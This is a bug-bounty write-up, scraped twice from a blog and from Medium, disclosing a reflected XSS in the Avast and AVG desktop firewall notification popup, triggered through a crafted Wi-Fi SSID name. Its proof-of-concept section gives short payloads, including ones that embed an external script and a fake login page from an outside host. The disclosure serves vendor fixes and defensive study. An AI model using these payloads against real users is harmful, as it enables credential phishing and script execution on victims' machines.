=== Content from firstsight.me_0f383169_20250121_010712.html ===

[Skip to content](#page)

[Just Another Simple Write-Up](http://firstsight.me/)

Expand Menu

* [Home](http://firstsight.me)
* [Current Page Parent Write-Up](http://firstsight.me/category/write-up/)Toggle Child Menu
  + [Current Page Parent All Write-Up](http://firstsight.me/category/write-up/)
  + [Web Apps](http://firstsight.me/category/web-apps/)
  + [Mobile Apps](http://firstsight.me/category/mobile-apps/)
  + [Current Page Parent Desktop Apps](http://firstsight.me/category/desktop-apps/)
* [Write-Up in Bahasa](http://firstsight.me/category/write-up-in-bahasa/)
* [Unwritten PoC](http://firstsight.me/category/random-things/)
* [About Me](http://firstsight.me/2014/07/about-me/)
* [CVE-IDs](http://firstsight.me/2016/04/cve-ids-achievements/)
* [Honors / Awards](http://firstsight.me/2015/06/honors-awards/)
* [Terms of Use](http://firstsight.me/2014/07/terms-of-use/)

![](http://www.firstsight.me/wp-content/uploads/2019/12/Ilmu-adalah-Cahaya.png)
YoKo Kho
Independent | Part Time Bug Hunter | OSCP, CRTO, eWPTXv2, eCPTX | Top 50, 2018, (Q3, Q4) 2019, (Q1, Q3, Q4) 2020, (Q1, Q2, Q3, Q4) 2021, and (Q1) 2022 Bugcrowd MVP | https://bugcrowd.com/YoKoKho | https://leanpub.com/bughunting101 - Bug Hunting 101 eBook - (Bahasa) Free!

[Bug Report](http://firstsight.me/category/bug-report/) / [Desktop Apps](http://firstsight.me/category/desktop-apps/) / [Write-Up](http://firstsight.me/category/write-up/)
# 5,000 USD XSS Issue at Avast Desktop AntiVirus for Windows (Yes, Desktop!)

October 29, 2019

CVE-2019–18653 & CVE-2019–18654: The story when Reflected XSS was triggered from the SSID Name (It also affected AVG AntiVirus because basically the product codes were mostly “merged”)

**In the name of Allah, the Most Gracious, the Most Merciful.**

So, this article will be explained in two ways, which are the one that tells how I got it and the one that tries to explain the basic and reference.
Readers could also read the TL;DR section directly.

---

### I. TL;DR

**1.1.** Create an SSID Name with a simple XSS Payload (with maximum = 32 characters). We can use [BruteLogic](https://twitter.com/BruteLogic) and [s0md3v](https://twitter.com/s0md3v) short XSS payload (thanks man!).

**1.2.** Connect your Windows OS (with Avast AntiVirus installed and active) to the SSID and wait for the Avast Network Notification Feature to trigger the XSS payload.

![](http://www.firstsight.me/wp-content/uploads/2019/12/Triggering-the-XSS-via-SSID-Name-1024x634.png)

*Figure 1. Triggering the XSS via SSID Name*

**1.3.** Report it to Avast and confirmed as a valid issue in about 2 days. And a few months later, they judged whether the issue was rather serious and decided to reward the report with $5000.

---

### II. Behind the Scene about How I got this Issue

A few years ago, I read a good article from one of the bug hunters when he just got a lot of XSS issues in some big companies by putting XSS payload on his SSID name (I really lost the bookmark for one thing). In short, when he surfs to many applications, he gets many applications that reflect the value of his SSID name (and XSS is triggered). From there, then I started using XSS payload as my SSID name (on OS X).

So, a few months ago, I got a notebook (with windows in it) from the office where I was working at that time. I installed everything I needed from the tethering connection and left Avast AntiVirus for the last (at home). At home, I continued the installation and everything went well.

Until one day I use this notebook again for training purposes. In the middle of training (day 3 or day 4), In the middle of training (day 3 or day 4), I had a problem with the used connection. So, suddenly this notebook connects to my tethering connection automatically (with Avast already installed), and within seconds, I get a pop-up warning with “**https://local.avast.com**” appearing on my desktop.

To be honest, I don’t know how it works. Lucky for me, there was a video recording in class and I asked to copy a conversation between this time period. Trying to find out how that happened, I finally got an answer the next day. That XSS is triggered because the embedded “**Network Notification Feature**” (Firewall) in Avast (specifically for Internet Security and Premiere Edition) reflects the SSID name and has not been sanitized yet.

Then I made a report that night, and got a reply about 2 days confirming whether the issue was valid.

---

### III. Abstract

As quoted from Avast’s official site, Avast as one of the largest security companies in the world that using next-gen technologies to fight cyber-attacks in real time, is dedicated to creating a world that provides safety and privacy for all, no matter who you are, where you are, or how you connect.

With so much research done by Avast, Avast tries to achieve the best endpoint protection for every user. One feature that has been embedded is the “**Firewall**” feature that can be used easily to manage incoming and outgoing traffic.

By default, this Firewall feature can give users a warning (pop-up notification) when they are connected to a **new network**. For example, like the image shown below, this shows that the user has just connected to a wireless network with “My Hotspot” as the SSID name.

![](http://www.firstsight.me/wp-content/uploads/2019/12/Popup-Notification-when-Connected-to-new-Network-1024x334.png)

*Figure 2. Popup Notification when Connected to new Network*

After the popup appears, the user can choose the type of network from the SSID they are connecting to, such as a “**Private**” network or a “**Public**” network.

However, a problem arises when this notification popup does’t filter out special characters that are reflected from the SSID name. In other words, an attacker can trigger XSS on a client through “**popup notifications**” by using the **malicious SSID name.**

---

### IV. Introduction

#### 4.1. Cross Site Scripting (XSS)

To put it simply, this kind of vulnerability is a vulnerability that could “let” an Attacker to be able to execute a code in the input section that hasn’t implemented filtering for special characters such as “ > < : / ; etc. In contrast to Stored XSS that “saves” the executed code, Reflected XSS actually doesn’t save this script at all, so the “target” is expected and required to visit the URL that has been “injected” by additional contents from an Attacker.

In this situation, Avast has reflected the input (from the SSID Name) into the popup notification (each time the user changes the connection). When the SSID name contains client-side scripts (such as javascript), notifications will trigger scripts that can trigger XSS vulnerabilities.

One good thing, even the SSID name has a limit of around 32 characters, we can still cut it off by calling a short URL. Credits to [Brute Logic](https://twitter.com/brutelogic) and [S0md3v](https://twitter.com/s0md3v), Thanks man!

---

#### 4.1.1. The Short XSS Payload

The first time I got a popup warning, I didn’t know how to trigger it further. Then Alhamdulillah, I was very lucky because I remembered reading a publication made by “*Brute Logic*” and “*S0md3v*” related the short XSS Payload. And the cool thing is, it works!

If you are looking for great and creative XSS payloads, then I recommend both of these researches:
• <https://brutelogic.com.br/blog/shortest-reflected-xss-possible/>
• <https://github.com/s0md3v/AwesomeXSS>

And yes (of course), there are plenty of researchers out there who still share other great and creative payload that you can follow.

---

#### 4.2. Research Story related things that could be Executed by using the Malicious SSID Name

As explained earlier, I realized this trick from writing released by one of the bug hunters (I’m very sorry, I really lost my bookmark because of one thing). From his research, I finally learned that research in this field was carried out in great detail in the 2013 by Deral Heiland. [He has published the research at BlackHat Europe 2013](https://media.blackhat.com/eu-13/briefings/Heiland/bh-eu-13-practical-exploitation-heiland-slides.pdf).

So, for research and in-depth knowledge about this, you can refer to his presentation. Very recommended.

---

#### 4.3. Affected Version and Testing Environment

**Avast:** The affected version of this vulnerability could be found at Avast Internet Security *version 19.3.2369 (build 19.3.4241.440)*. It also affects the Avast Free Antivirus the premiere one.

**And from the AVG side:** the issue was affects the AVG Internet Security version 19.3.3084 (build 19.3.4241.440).

As a little note, both of issue has been reproduced at the Windows 10 environment (latest patch – per March 22nd, 2019).

---

### V. Summary of Issue

As explained earlier, the security problem in this report is a vulnerability that can allow an Attacker to trigger XSS on the client through “popup notifications” using the malicious SSID name.

In this situation, the Attacker can also display a fake login page (for example with the Avast / AVG logo) via “popup notifications” and the user will not feel suspicious because there is no URL that can be seen / detected when the script triggers a fake login page.

![](http://www.firstsight.me/wp-content/uploads/2019/12/Sample-Case-to-Triggering-the-Fake-Login-Page-Avast-1024x337.png)

*Figure 3. Sample Case to Triggering the Fake Login Page – Avast*

![](http://www.firstsight.me/wp-content/uploads/2019/12/Sample-Case-to-Triggering-the-Fake-Login-Page-AVG-1024x329.png)

*Figure 4. Sample Case to Triggering the Fake Login Page – AVG*

---

### VI. Proof of Concept

To complete the explanation, there are few things that must be done to reproduce this issue. Here are the steps that need to be prepared:

**6.1.** Create SSID with simple JavaScript as the name of the SSID. For example: ***><img src=x onerror=prompt(1)>***The basic purpose of using this script is to trigger a popup warning with “1” as a character.

**6.2.** Make sure if the victim is connected to the SSID that was prepared;

**6.3.** After the victim is connected to the SSID that is prepared, then wait a few seconds. A **pop-up notification** will be displayed, and the script will be triggered:

![](http://www.firstsight.me/wp-content/uploads/2019/12/The-Script-has-been-Triggered-via-Notification-Popup-Avast-1024x634.png)

*Figure 5. The Script has been Triggered via Notification Popup – Avast*

![](http://www.firstsight.me/wp-content/uploads/2019/12/The-Script-has-been-Triggered-via-Notification-Popup-AVG-1024x399.png)

*Figure 6. The Script has been Triggered via Notification Popup – AVG*

**6.4.** Because the SSID name is limited to 32 characters, we must trick the script by using the short URL service. For example, we try to trigger login forms from other portals.. The used script is: ***><embed src=//tiny.cc/XYZABCX>*** (you also could use bit.ly).

![](http://www.firstsight.me/wp-content/uploads/2019/12/Triggering-the-Login-Form-from-other-Portal-to-Notification-Popup-1024x481.png)

*Figure 7. Triggering the Login Form from other Portal to Notification Popup*

![](http://www.firstsight.me/wp-content/uploads/2019/12/Triggering-the-Login-Form-from-other-Portal-to-Notification-Popup-II-1024x337.png)

*Figure 8. Triggering the Login Form from other Portal to Notification Popup II*

And the good thing is, you can also trigger scripts from other external URLs (credits to s0md3v). Here is an example: ***><embed src=//14.rs>***

![](http://www.firstsight.me/wp-content/uploads/2019/12/Triggering-the-script-by-Using-the-External-Script-1024x391.png)

*Figure 9. Triggering the script by Using the External Script*

---

### VII. Additional Information

To complete the explanation, here is a simple PoC video that can be seen about this:

PoC Video – Triggering the XSS Payload via SSID Name

---

### VIII. Reporting Timeline

* **Mar 21st, 2019:** Found the issue and don’t know the root cause yet;
* **Mar 22nd, 2019:** Found the problem, then create and send the report via bugs@avast.com;
* **Mar 25th, 2019:** Send the information if AVG is affected too;
* **Mar 25th, 2019:** Avast replied and confirmed the bug. They said if they will release a fix soon;
* **Mar 25th, 2019:** Avast replied if that not surprising (if AVG was affect with the same issue). They give a high level explanation nicely.
* **May 24th, 2019:** Avast said if the issue was fixed (in Avast 19.4) and already release. They also said if they will give more details when the reward is decided.
* **June 12th, 2019:** Avast judged this issue to be rather serious and decided to reward the report with $5000. (Really amazing).

![](http://www.firstsight.me/wp-content/uploads/2019/12/Reward-Decision-from-Avast-1024x418.png)

*Figure 10. Reward Decision from Avast*

This one really broke the record I had in one reward payment. Also, that decision really surprised me. At that time, I still didn’t believe until the numbers actually came into my Paypal account.

**For Avast:** Thank you very much for the surprising reward and amazing program! Greatly appreciated. I have lost my words to thanking them.

* **Oct 30th, 2019:** *CVE-2019–18653* has been assigned for issue at Avast and *CVE-2019–18654* has been assigned for issue at AVG.

---

### IX. The Closing

Well, as can be seen by the reader, this is something I never imagined (triggering XSS on the Desktop App). Some simple notes that I might be able to share (with my limited knowledge) are:

* Always try to bookmark everything you read. Put notes and comeback when you want to use those tricks for your target. In this case, one day I read and saved a publication made by Brute Logic and s0md3v. When I meet a difficult situation (for example triggering XSS with limited characters), I return to their write-up and open my notes.
* Even though it looks silly, it would be better if you enter your SSID name with (for example) Payload XSS. I have placed it for several years (since the first time I read the article published by a bug hunter out there, thank you!), But I found it was triggered in 2019 on Desktop Applications on Windows OS (does’t affect the OS X version of Avast).

Also, another vector that I learned from this is:

* XSS through malicious SSID Names can also be triggered for the one that reflecting or storing our SSID name at the App. In this case, Avast and AVG has reflecting the SSID Name.
* Apart from the desktop one, just please kindly don’t forget about the XSS that could also be triggered by Web or Mobile Application that reflecting the SSID Name.
* At the other side, I also have learnt if the one that stored the SSID Name could also be vulnerable. At least, I have saw it at few write-ups such as:
  • [[CVE-2019–11877] Credentials Stealing Through XSS on Pix-Link Repeater](https://medium.com/%40igor.lrgomes/cve-2019-11877-credentials-stealing-through-xss-on-pix-link-repeater-9a98c344f58e)
  • [[CVE-2017–14219] XSS in Intelbras Router WRN 240](https://medium.com/%40elberandre/router-exploit-getting-wireless-password-and-administrator-session-without-being-connected-on-the-e6c0517b00a6) – *Getting Wireless Password and Administrator Session Without Being Connected on the Same Network*• [[CVE-2018–17337] XSS via SSID at N.Plug Wireless Repeater version 1.0.0.14](https://packetstormsecurity.com/files/149730/NPLUG-Wireless-Repeater-1.0.0.14-CSRF-XSS-Authentication-Bypass.html)

---

### X. Credits

* <https://media.blackhat.com/eu-13/briefings/Heiland/bh-eu-13-practical-exploitation-heiland-slides.pdf>
* <https://blog.rapid7.com/2016/03/09/its-all-in-the-name/> **(also written by Deral Heiland)**
* <https://brutelogic.com.br/blog/shortest-reflected-xss-possible/>
* <https://github.com/s0md3v/AwesomeXSS>

Tags: [Avast Bug Bounty](http://firstsight.me/tag/avast-bug-bounty/)[AVG Bug Bounty](http://firstsight.me/tag/avg-bug-bounty/)[XSS](http://firstsight.me/tag/xss/)[XSS via SSID](http://firstsight.me/tag/xss-via-ssid/)

Share

#### You may also like...

* [![](http://firstsight.me/wp-content/uploads/2019/12/Unrestricted-Deletion-to-other-Sub-Account-520x292.png)](http://firstsight.me/2017/05/fortinet-unrestricted-deletion-to-all-other-sub-account-via-idor-at-support-portal/)

  #### [FortiNet – Unrestricted Deletion to All Other Sub Account via IDOR at Support Portal](http://firstsight.me/2017/05/fortinet-unrestricted-deletion-to-all-other-sub-account-via-idor-at-support-portal/)
* [![](http://firstsight.me/wp-content/uploads/2024/06/Decryption-Process-520x292.png)](http://firstsight.me/2024/05/electron-based-app-security-testing-fundamentals-part-3-2nd-section-extracting-and-analyzing-asar-files-company-blog/)

  #### [Electron-Based App Security Testing Fundamentals Part 3 (2nd Section) — Extracting and Analyzing .asar Files – Company Blog](http://firstsight.me/2024/05/electron-based-app-security-testing-fundamentals-part-3-2nd-section-extracting-and-analyzing-asar-files-company-blog/)
* [![](http://firstsight.me/wp-content/uploads/2020/06/Figure-8-Current-Condition-Could-be-Manipulated-520x292.png)](http://firstsight.me/2016/08/bahasa-tokopedia-unrestricted-deletion-to-all-of-peoples-bank-account/)

  #### [[Bahasa] Tokopedia – Penghapusan Ilegal terhadap seluruh rekening terdaftar milik Pengguna](http://firstsight.me/2016/08/bahasa-tokopedia-unrestricted-deletion-to-all-of-peoples-bank-account/)

* [**Next story** From Recon to Optimizing RCE Results – Simple Story with One of the Biggest ICT Company in the World](http://firstsight.me/2020/02/from-recon-to-optimizing-rce-results-simple-story-with-one-of-the-biggest-ict-company-in-the-world/)
* [**Previous story** CVE-2019–18624 – Illegal Rendered at Download Feature in Several Apps (including Opera Mini) that Lead to Extension Manipulation (with RTLO)](http://firstsight.me/2019/10/illegal-rendered-at-download-feature-in-several-apps-including-opera-mini-that-lead-to-extension-manipulation-with-rtlo/)

### Search

### Recent Posts

* [Understanding Stealer Logs and Their Role in Security Testing: A Focus on Asset Discovery— Part 2 – Company Blog](http://firstsight.me/2025/01/understanding-stealer-logs-and-their-role-in-security-testing-a-focus-on-asset-discovery-part-2/)
* [Bypassing iOS App Jailbreak Detection by Patching the Binary with Ghidra: Write-up of No-Escape Lab from MobileHackingLab – Company Blog](http://firstsight.me/2024/12/bypassing-ios-app-jailbreak-detection-by-patching-the-binary-with-ghidra-write-up-of-no-escape-lab-from-mobilehackinglab/)
* [Understanding Stealer Logs and Its Role in Security Testing — Part 1 – Company Blog](http://firstsight.me/2024/08/understanding-stealer-logs-and-its-role-in-security-testing-part-1/)
* [Electron-Based App Security Testing Fundamentals Part 3 (2nd Section) — Extracting and Analyzing .asar Files – Company Blog](http://firstsight.me/2024/05/electron-based-app-security-testing-fundamentals-part-3-2nd-section-extracting-and-analyzing-asar-files-company-blog/)
* [Electron-Based App Security Testing Fundamentals Part 3 (1st Section) — Extracting and Analyzing .asar Files – Company Blog](http://firstsight.me/2024/04/electron-based-app-security-testing-fundamentals-part-3-1st-section-extracting-and-analyzing-asar-files-company-blog/)
* [Electron-Based App Security Testing Fundamentals Part 2— Installing and Detecting Electron-Based Application – Company Blog](http://firstsight.me/2024/04/electron-based-app-security-testing-fundamentals-part-2-installing-and-detecting-electron-based-application-company-blog/)
* [Electron-Based App Security Testing Fundamentals Part 1 — Introduction to Electron Framework – Company Blog](http://firstsight.me/2024/03/electron-based-app-security-testing-fundamentals-part-1-introduction-to-electron-framework-company-blog/)
### Categories

* [About Me](http://firstsight.me/category/about-me/) (3)
* [Achievements](http://firstsight.me/category/achievements/) (2)
* [Bug Report](http://firstsight.me/category/bug-report/) (30)
* [Desktop Apps](http://firstsight.me/category/desktop-apps/) (8)
* [Mobile Apps](http://firstsight.me/category/mobile-apps/) (6)
* [Random Things](http://firstsight.me/category/random-things/) (8)
* [Terms of Use](http://firstsight.me/category/terms-of-use/) (1)
* [Web Apps](http://firstsight.me/category/web-apps/) (21)
* [Write-Up](http://firstsight.me/category/write-up/) (22)
* [Write-Up in Bahasa](http://firstsight.me/category/write-up-in-bahasa/) (4)

Firstsight.me © 2024. All Rights Reserved.

Powered by [WordPress](http://wordpress.org). Theme by [Alx](http://alx.media).



=== Content from medium.com_b5bbe176_20250121_010712.html ===
[Open in app](https://rsci.app.link/?%24canonical_url=https%3A%2F%2Fmedium.com%2Fp%2F1e99375f0968&%7Efeature=LoOpenInAppButton&%7Echannel=ShowPostUnderCollection&source=---top_nav_layout_nav----------------------------------)

[Sign up](https://medium.com/m/signin?operation=register&redirect=https%3A%2F%2Finfosecwriteups.com%2F5-000-usd-xss-issue-at-avast-desktop-antivirus-for-windows-yes-desktop-1e99375f0968&source=post_page---top_nav_layout_nav-----------------------global_nav-----------)

[Sign in](https://medium.com/m/signin?operation=login&redirect=https%3A%2F%2Finfosecwriteups.com%2F5-000-usd-xss-issue-at-avast-desktop-antivirus-for-windows-yes-desktop-1e99375f0968&source=post_page---top_nav_layout_nav-----------------------global_nav-----------)

[Write](https://medium.com/m/signin?operation=register&redirect=https%3A%2F%2Fmedium.com%2Fnew-story&source=---top_nav_layout_nav-----------------------new_post_topnav-----------)

[Sign up](https://medium.com/m/signin?operation=register&redirect=https%3A%2F%2Finfosecwriteups.com%2F5-000-usd-xss-issue-at-avast-desktop-antivirus-for-windows-yes-desktop-1e99375f0968&source=post_page---top_nav_layout_nav-----------------------global_nav-----------)

[Sign in](https://medium.com/m/signin?operation=login&redirect=https%3A%2F%2Finfosecwriteups.com%2F5-000-usd-xss-issue-at-avast-desktop-antivirus-for-windows-yes-desktop-1e99375f0968&source=post_page---top_nav_layout_nav-----------------------global_nav-----------)

![](https://miro.medium.com/v2/resize:fill:64:64/1*dmbNkD5D-u45r44go_cf0g.png)
# 5,000 USD XSS Issue at Avast Desktop AntiVirus for Windows (Yes, Desktop!)

## CVE-2019–18653 & CVE-2019–18654: The story when Reflected XSS was triggered from the SSID Name (It also affected AVG AntiVirus because basically the product codes were mostly “merged”).

[![YoKo Kho](https://miro.medium.com/v2/resize:fill:88:88/1*dmbNkD5D-u45r44go_cf0g.png)](https://medium.com/%40YoKoKho?source=post_page---byline--1e99375f0968--------------------------------)[![InfoSec Write-ups](https://miro.medium.com/v2/resize:fill:48:48/1*SWJxYWGZzgmBP1D0Qg_3zQ.png)](https://infosecwriteups.com/?source=post_page---byline--1e99375f0968--------------------------------)

[YoKo Kho](https://medium.com/%40YoKoKho?source=post_page---byline--1e99375f0968--------------------------------)

·

[Follow](https://medium.com/m/signin?actionUrl=https%3A%2F%2Fmedium.com%2F_%2Fsubscribe%2Fuser%2Fc340b945467d&operation=register&redirect=https%3A%2F%2Finfosecwriteups.com%2F5-000-usd-xss-issue-at-avast-desktop-antivirus-for-windows-yes-desktop-1e99375f0968&user=YoKo+Kho&userId=c340b945467d&source=post_page-c340b945467d--byline--1e99375f0968---------------------post_header-----------)

Published in[InfoSec Write-ups](https://infosecwriteups.com/?source=post_page---byline--1e99375f0968--------------------------------)·9 min read·Oct 29, 2019

--

1

Listen

Share

بسم الله الرحمن الرحيم

```
So, this article will be explained in two ways, which are the one that tells how I got it and the one that tries to explain the basic and reference.Readers could also read the TL;DR section directly.
```
## I. TL;DR

**1.1.** Create an SSID Name with a simple XSS Payload (with maximum = 32 characters). We can use [BruteLogic](https://twitter.com/BruteLogic) and [s0md3v](https://twitter.com/s0md3v) short XSS payload (thanks man!).

**1.2.** Connect your Windows OS (with Avast AntiVirus installed and active) to the SSID and wait for the Avast Network Notification Feature to trigger the XSS payload.

![]()

Triggering the XSS via SSID Name

**1.3.** Report it to Avast and confirmed as a valid issue in about 2 days. And a few months later, they judged whether the issue was rather serious and decided to reward the report with $5000.

## II. Behind the Scene about How I got this Issue

A few years ago, I read a good article from one of the bug hunters when he just got a lot of XSS issues in some big companies by putting XSS payload on his SSID name (I really lost the bookmark for one reason). In short, when he surfs to many applications, he gets many applications that reflect the value of his SSID name (and XSS is triggered). From there, then I started using XSS payload as my SSID name (on OS X).

So, a few months ago, I got a notebook (with windows in it) from the office where I was working at that time. I installed everything I needed from the tethering connection and left Avast AntiVirus for the last (at home). At home, I continued the installation and everything went well.

Until one day I use this notebook again for training purposes. In the middle of training (day 3 or day 4), In the middle of training (day 3 or day 4), I had a problem with the used connection. So, suddenly this notebook connects to my tethering connection automatically (with Avast already installed), and within seconds, I get a pop-up warning with “**https://local.avast.com**” appearing on my desktop.

To be honest, I don’t know how it works. Lucky for me, there was a video recording in class and I asked to copy a conversation between this time period. Trying to find out how that happened, I finally got an answer the next day. That XSS is triggered because the embedded “**Network Notification Feature**” (Firewall) in Avast (specifically for Internet Security and Premiere Edition) reflects the SSID name and has not been sanitized yet.

Then I made a report that night, and got a reply about 2 days confirming whether the issue was valid.

## III. Abstract

As quoted from Avast’s official site, Avast as one of the largest security companies in the world that using next-gen technologies to fight cyber-attacks in real time, is dedicated to creating a world that provides safety and privacy for all, no matter who you are, where you are, or how you connect.

With so much research done by Avast, Avast tries to achieve the best endpoint protection for every user. One feature that has been embedded is the “**Firewall**” feature that can be used easily to manage incoming and outgoing traffic.

By default, this Firewall feature can give users a warning (pop-up notification) when they are connected to a **new network**. For example, like the image shown below, this shows that the user has just connected to a wireless network with “My Hotspot” as the SSID name.

![]()

Popup Notification when Connected to new Network

After the popup appears, the user can choose the type of network from the SSID they are connecting to, such as a “**Private**” network or a “**Public**” network.

However, a problem arises when this notification popup does’t filter out special characters that are reflected from the SSID name. In other words, an attacker can trigger XSS on a client through “**popup notifications**” by using the **malicious SSID name.**

## IV. Introduction

**4.1. Cross Site Scripting (XSS)**To put it simply, this kind of vulnerability is a vulnerability that could “let” an Attacker to be able to execute a code in the input section that hasn’t implemented filtering for special characters such as “ > < : / ; etc. In contrast to Stored XSS that “saves” the executed code, Reflected XSS actually doesn’t save this script at all, so the “target” is expected and required to visit the URL that has been “injected” by additional contents from an Attacker.

In this situation, Avast has reflected the input (from the SSID Name) into the popup notification (each time the user changes the connection). When the SSID name contains client-side scripts (such as javascript), notifications will trigger scripts that can trigger XSS vulnerabilities.

One good thing, even the SSID name has a limit of around 32 characters, we can still cut it off by calling a short URL. Credits to [Brute Logic](https://twitter.com/brutelogic) and [S0md3v](https://twitter.com/s0md3v), Thanks man!

**4.1.1. The Short XSS Payload**
The first time I got a popup warning, I didn’t know how to trigger it further. Then Alhamdulillah, I was very lucky because I remembered reading a publication made by “*Brute Logic*” and “*S0md3v*” related the short XSS Payload. And the cool thing is, it works!

If you are looking for great and creative XSS payloads, then I recommend both of these researches:
• <https://brutelogic.com.br/blog/shortest-reflected-xss-possible/>
• <https://github.com/s0md3v/AwesomeXSS>

And yes (of course), there are plenty of researchers out there who still share other great and creative payload that you can follow.

**4.2. Research Story related things that could be Executed by using the Malicious SSID Name**
As explained earlier, I realized this trick from writing released by one of the bug hunters (I’m very sorry, I really lost my bookmark because of one thing). From his research, I finally learned that research in this field was carried out in great detail in the 2013 by Deral Heiland. [He has published the research at BlackHat Europe 2013](https://media.blackhat.com/eu-13/briefings/Heiland/bh-eu-13-practical-exploitation-heiland-slides.pdf).

So, for research and in-depth knowledge about this, you can refer to his presentation. Very recommended.

**4.3. Affected Version and Testing Environment
Avast:** The affected version of this vulnerability could be found at Avast Internet Security *version 19.3.2369 (build 19.3.4241.440)*. It also affects the Avast Free Antivirus the premiere one.

**And from the AVG side:** the issue was affects the AVG Internet Security version 19.3.3084 (build 19.3.4241.440).

As a little note, both of issue has been reproduced at the Windows 10 environment (latest patch — per March 22nd, 2019).

## V. Summary of Issue

As explained earlier, the security problem in this report is a vulnerability that can allow an Attacker to trigger XSS on the client through “popup notifications” using the malicious SSID name.

In this situation, the Attacker can also display a fake login page (for example with the Avast / AVG logo) via “popup notifications” and the user will not feel suspicious because there is no URL that can be seen / detected when the script triggers a fake login page.

![]()

Sample Case to Triggering the Fake Login Page - Avast

![]()

Sample Case to Triggering the Fake Login Page - AVG

## VI. Proof of Concept

To complete the explanation, there are few things that must be done to reproduce this issue. Here are the steps that need to be prepared:

**6.1.** Create SSID with simple JavaScript as the name of the SSID. For example: ***><img src=x onerror=prompt(1)>***The basic purpose of using this script is to trigger a popup warning with “1” as a character.

**6.2.** Make sure if the victim is connected to the SSID that was prepared;

**6.3.** After the victim is connected to the SSID that is prepared, then wait a few seconds. A **pop-up notification** will be displayed, and the script will be triggered:

![]()

The Script has been Triggered via Notification Popup - Avast

![]()

The Script has been Triggered via Notification Popup - AVG

**6.4.** Because the SSID name is limited to 32 characters, we must trick the script by using the short URL service. For example, we try to trigger login forms from other portals.. The used script is: ***><embed src=//tiny.cc/XYZABCX>*** (you also could use bit.ly).

![]()

Triggering the Login Form from other Portal to Notification Popup

![]()

Triggering the Login Form from other Portal to Notification Popup II

And the good thing is, you can also trigger scripts from other external URLs (credits to s0md3v). Here is an example: ***><embed src=//14.rs>***

![]()

Triggering the script by Using the External Script

## VII. Additional Information

To complete the explanation, here is a simple PoC video that can be seen about this:

PoC Video - Triggering the XSS Payload via SSID Name

## VIII. Reporting Timeline

* **Mar 21st, 2019:** Found the issue and don’t know the root cause yet;
* **Mar 22nd, 2019:** Found the problem, then create and send the report via bugs@avast.com;
* **Mar 25th, 2019:** Send the information if AVG is affected too;
* **Mar 25th, 2019:** Avast replied and confirmed the bug. They said if they will release a fix soon;
* **Mar 25th, 2019:** Avast replied if that not surprising (if AVG was affect with the same issue). They give a high level explanation nicely.
* **May 24th, 2019:** Avast said if the issue was fixed (in Avast 19.4) and already release. They also said if they will give more details when the reward is decided.
* **June 12th, 2019:** Avast judged this issue to be rather serious and decided to reward the report with $5000. (Really amazing).

![]()

Reward Decision from Avast

This one really broke the record I had in one reward payment. Also, that decision really surprised me. At that time, I still didn’t believe until the numbers actually came into my Paypal account.

**For Avast:** Thank you very much for the surprising reward and amazing program! Greatly appreciated. I have lost my words to thanking them.

* **Oct 30th, 2019:** *CVE-2019–18653* has been assigned for issue at Avast and *CVE-2019–18654* has been assigned for issue at AVG.
## IX. The Closing

Well, as can be seen by the reader, this is something I never imagined (triggering XSS on the Desktop App). Some simple notes that I might be able to share (with my limited knowledge) are:

* Always try to bookmark everything you read. Put notes and comeback when you want to use those tricks for your target. In this case, one day I read and saved a publication made by Brute Logic and s0md3v. When I meet a difficult situation (for example triggering XSS with limited characters), I return to their write-up and open my notes.
* Even though it looks silly, it would be better if you enter your SSID name with (for example) Payload XSS. I have placed it for several years (since the first time I read the article published by a bug hunter out there, thank you!), But I found it was triggered in 2019 on Desktop Applications on Windows OS (does’t affect the OS X version of Avast).

Also, another vector that I learned from this is:

* XSS through malicious SSID Names can also be triggered for the one that reflecting or storing our SSID name at the App. In this case, Avast and AVG has reflecting the SSID Name.
* Apart from the desktop one, just please kindly don’t forget about the XSS that could also be triggered by Web or Mobile Application that reflecting the SSID Name.
* At the other side, I also have learnt if the one that stored the SSID Name could also be vulnerable. At least, I have saw it at few write-ups such as:
  • [[CVE-2019–11877] Credentials Stealing Through XSS on Pix-Link Repeater](https://medium.com/%40igor.lrgomes/cve-2019-11877-credentials-stealing-through-xss-on-pix-link-repeater-9a98c344f58e)
  • [[CVE-2017–14219] XSS in Intelbras Router WRN 240](https://medium.com/%40elberandre/router-exploit-getting-wireless-password-and-administrator-session-without-being-connected-on-the-e6c0517b00a6) — *Getting Wireless Password and Administrator Session Without Being Connected on the Same Network*• [[CVE-2018–17337] XSS via SSID at N.Plug Wireless Repeater version 1.0.0.14](https://packetstormsecurity.com/files/149730/NPLUG-Wireless-Repeater-1.0.0.14-CSRF-XSS-Authentication-Bypass.html)
## X. Credits

* <https://media.blackhat.com/eu-13/briefings/Heiland/bh-eu-13-practical-exploitation-heiland-slides.pdf>
* <https://blog.rapid7.com/2016/03/09/its-all-in-the-name/> **(also written by Deral Heiland)**
* <https://brutelogic.com.br/blog/shortest-reflected-xss-possible/>
* <https://github.com/s0md3v/AwesomeXSS>

*Follow* [*Infosec Write-ups*](https://medium.com/bugbountywriteup) *for more such awesome write-ups.*

[## InfoSec Write-ups

### A collection of write-ups from the best hackers in the world on topics ranging from bug bounties and CTFs to vulnhub…

medium.com](https://medium.com/bugbountywriteup?source=post_page-----1e99375f0968--------------------------------)[Bug Bounty](https://medium.com/tag/bug-bounty?source=post_page-----1e99375f0968--------------------------------)[Xss](https://medium.com/tag/xss?source=post_page-----1e99375f0968--------------------------------)[Infosec](https://medium.com/tag/infosec?source=post_page-----1e99375f0968--------------------------------)[Security](https://medium.com/tag/security?source=post_page-----1e99375f0968--------------------------------)[Bug Bounty Tips](https://medium.com/tag/bug-bounty-tips?source=post_page-----1e99375f0968--------------------------------)

--

--

1

[![InfoSec Write-ups](https://miro.medium.com/v2/resize:fill:96:96/1*SWJxYWGZzgmBP1D0Qg_3zQ.png)](https://infosecwriteups.com/?source=post_page---post_publication_info--1e99375f0968--------------------------------)[![InfoSec Write-ups](https://miro.medium.com/v2/resize:fill:128:128/1*SWJxYWGZzgmBP1D0Qg_3zQ.png)](https://infosecwriteups.com/?source=post_page---post_publication_info--1e99375f0968--------------------------------)[## Published in InfoSec Write-ups](https://infosecwriteups.com/?source=post_page---post_publication_info--1e99375f0968--------------------------------)[51K Followers](/followers?source=post_page---post_publication_info--1e99375f0968--------------------------------)·[Last published 8 hours ago](/how-i-found-s3-buckets-in-bug-bounties-501faf76c3f9?source=post_page---post_publication_info--1e99375f0968--------------------------------)

A collection of write-ups from the best hackers in the world on topics ranging from bug bounties and CTFs to vulnhub machines, hardware challenges and real life encounters. Subscribe to our weekly newsletter for the coolest infosec updates: <https://weekly.infosecwriteups.com/>

